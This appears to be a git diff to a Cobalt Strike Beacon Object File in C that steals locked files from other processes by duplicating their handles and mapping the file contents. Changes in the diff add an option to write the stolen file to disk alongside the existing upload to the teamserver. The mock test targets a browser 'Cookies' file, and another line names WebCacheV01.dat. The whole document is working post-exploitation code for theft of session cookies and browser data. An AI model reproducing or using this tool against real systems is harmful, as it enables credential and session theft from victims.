@@ -54,6 +54,8 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
     DFR(KERNEL32, MapViewOfFile);
     DFR(KERNEL32, UnmapViewOfFile);
     DFR(KERNEL32, CreateFileMappingA);
+    DFR(KERNEL32, CreateFileW);
+    DFR(KERNEL32, WriteFile);
     //MSVCRT DFR
     DFR(MSVCRT, wcstombs)
     DFR(MSVCRT, wcscmp)
@@ -76,11 +78,14 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
     #define MapViewOfFile KERNEL32$MapViewOfFile
     #define UnmapViewOfFile KERNEL32$UnmapViewOfFile
     #define CreateFileMappingA KERNEL32$CreateFileMappingA
+    #define CreateFileW KERNEL32$CreateFileW
+    #define WriteFile KERNEL32$WriteFile
     //MSVCRT Definitions
     #define wcstombs MSVCRT$wcstombs
     #define wcscmp MSVCRT$wcscmp
     #define wcslen MSVCRT$wcslen
     #define memset MSVCRT$memset
+
 
     void go(char* buf,int len) {
         //Local Variables
@@ -90,13 +95,13 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
         int value_int = 0;
         datap parser;
         BOOL Success = false;
-        
+        BOOL copyFile = false;
         //Obtain beacon arguments
         BeaconDataParse(&parser, buf, len);
         pid = BeaconDataInt(&parser);
         key = (wchar_t*)BeaconDataExtract(&parser, NULL);
         size_t keyLen = wcslen(key);
-
+        wchar_t* outputFile = NULL;
         //Value will either be a wchar_t or int based off wither key value filename or handle_id was chosen
         if (!wcscmp(L"filename", key)) {
             value_wchar = (wchar_t*)BeaconDataExtract(&parser, NULL);
@@ -109,7 +114,15 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
 
         }
 
-
+        //Check if fileless download or copying to disk. 
+        copyFile = BeaconDataInt(&parser);
+        if (copyFile) {
+            outputFile = (wchar_t*)BeaconDataExtract(&parser, NULL);
+            if (outputFile == NULL || wcslen(outputFile) == 0) {
+                BeaconPrintf(CALLBACK_ERROR, "Please provide an outputfile path when using the /copy switch");
+                return;
+            }
+        }
 
         DWORD dwErrorCode = ERROR_SUCCESS;
         PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
@@ -321,57 +334,57 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                         continue;
                     }
                     
-                    #ifdef _DEBUG
-                    // Construct the full path to the file on the desktop
-                    WCHAR filePath[MAX_PATH];
-                    wcscpy(filePath, L"C:\\"); ///Select your own directory for debugging purposes
-                    wcscat(filePath, fileName);
+                    if (copyFile) {
+                        // Construct the full path to the file on the desktop
+                        WCHAR filePath[MAX_PATH];
 
-                    // Create or open the file for writing
-                    HANDLE hFile = CreateFileW(filePath, 0x80000000 | 0x40000000, 0x00000001 | 0x00000002, NULL, 0x00000002, 0, NULL);
+                        // Create or open the file for writing
+                        HANDLE hFile = CreateFileW(outputFile, 0x80000000 | 0x40000000, 0x00000001 | 0x00000002, NULL, 0x00000002, 0, NULL);
 
-                    if (hFile != INVALID_HANDLE_VALUE) {
-                        DWORD dwWritten = 0;
-                        // Write the contents of the buffer to the file
-                        BOOL writeStatus = WriteFile(hFile, viewPointer, dwFileSize, &dwWritten, NULL);
+                        if (hFile != INVALID_HANDLE_VALUE) {
+                            DWORD dwWritten = 0;
+                            // Write the contents of the buffer to the file
+                            BOOL writeStatus = WriteFile(hFile, viewPointer, dwFileSize, &dwWritten, NULL);
 
-                        if (writeStatus) {
-                            BeaconPrintf(CALLBACK_OUTPUT, "Downloaded file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
+                            if (writeStatus) {
+                                BeaconPrintf(CALLBACK_OUTPUT, "Copied file % .*S to % .*S\n", wcslen(fileName), fileName, wcslen(outputFile),outputFile);
 
+                            }
+                            else {
+                                BeaconPrintf(CALLBACK_ERROR, "Error: Failed to write data to file. Error code: %ul\n", GetLastError());
+                            }
+                            UnmapViewOfFile(viewPointer);
+                            NtClose(hFile);
+                            hFile = NULL;
                         }
                         else {
-                            BeaconPrintf(CALLBACK_ERROR,"Error: Failed to write data to file. Error code: %ul\n", GetLastError());
-                        }
-                        UnmapViewOfFile(viewPointer);
-                        NtClose(hFile);
-                        hFile = NULL;
-                    }
-
-                    #else
-                    //Convert the wchar_t* string to a multibyte string using wcstombs_s
-                    //This is all to convert the wchar filename to char
-                    const size_t bufferSize = wcstombs(NULL, fileName, 0);
-                    if (bufferSize < 1) {
-                        BeaconPrintf(CALLBACK_ERROR, "Error: Unable to retrieve file size");
-                    }
-                    
-                    char* fileNameChar = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize+1);  // +1 for null-terminator
-                    size_t convertedChars = 0;
-                    if (!wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName, bufferSize)) {
-                        //Upload file to cobalt strike using method from nanodump
-                        if (upload_file(fileNameChar, (char *)viewPointer, dwFileSize)) {
-                            BeaconPrintf(CALLBACK_OUTPUT, "Downloaded file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
-                        }
-                        else {
-                            BeaconPrintf(CALLBACK_ERROR, "Failed to downlaod file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
+                            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to create file. Error code: %ul\n", GetLastError());
                         }
                     }
                     else {
-                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to convert file name to char probably because im not the best coder");
-                    }
-                    UnmapViewOfFile(viewPointer);
-                    
-                    #endif
+                        //Convert the wchar_t* string to a multibyte string using wcstombs_s
+                        //This is all to convert the wchar filename to char
+                        const size_t bufferSize = wcstombs(NULL, fileName, 0);
+                        if (bufferSize < 1) {
+                            BeaconPrintf(CALLBACK_ERROR, "Error: Unable to retrieve file size");
+                        }
+
+                        char* fileNameChar = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize + 1);  // +1 for null-terminator
+                        size_t convertedChars = 0;
+                        if (!wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName, bufferSize)) {
+                            //Upload file to cobalt strike using method from nanodump
+                            if (upload_file(fileNameChar, (char*)viewPointer, dwFileSize)) {
+                                BeaconPrintf(CALLBACK_OUTPUT, "Downloaded file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
+                            }
+                            else {
+                                BeaconPrintf(CALLBACK_ERROR, "Failed to downlaod file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
+                            }
+                        }
+                        else {
+                            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to convert file name to char probably because im not the best coder");
+                        }
+                        UnmapViewOfFile(viewPointer);
+                    }  
                     break;
                 }
             }
@@ -504,7 +517,7 @@ int main(int argc, char* argv[]) {
     // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
     //bof::runMocked<int, wchar_t*, wchar_t*>(go, 6696, L"filename", L"Cookies");
 
-    bof::runMocked<int, wchar_t*, wchar_t*>(go, 3428, L"filename",L"WebCacheV01.dat");
+    bof::runMocked<int, wchar_t*, wchar_t*, int, wchar_t*>(go, 15796, L"filename", L"Cookies", 1, L"C:\\Users\\defaultuser\\AppData\\Local\\Temp\\Cookies123.tmp");
     return 0;
 }
 
